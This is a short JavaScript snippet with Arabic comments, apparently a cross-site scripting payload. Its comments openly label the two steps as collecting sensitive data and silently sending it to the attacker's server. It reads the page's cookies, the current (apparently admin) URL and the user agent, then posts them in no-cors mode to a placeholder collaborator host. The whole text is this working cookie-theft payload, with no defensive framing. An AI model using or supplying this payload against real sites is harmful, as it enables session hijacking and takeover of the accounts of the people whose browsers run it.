// 1. جمع البيانات الحساسة
var payload = {
    cookies: document.cookie,
    admin_url: window.location.href,
    user_agent: navigator.userAgent
};

// 2. إرسال البيانات بصمت إلى خادم المخترق
fetch('https://your-collaborator-url.com/log', {
    method: 'POST',
    mode: 'no-cors', // لتجاوز قيود CORS البسيطة
    body: JSON.stringify(payload)
});
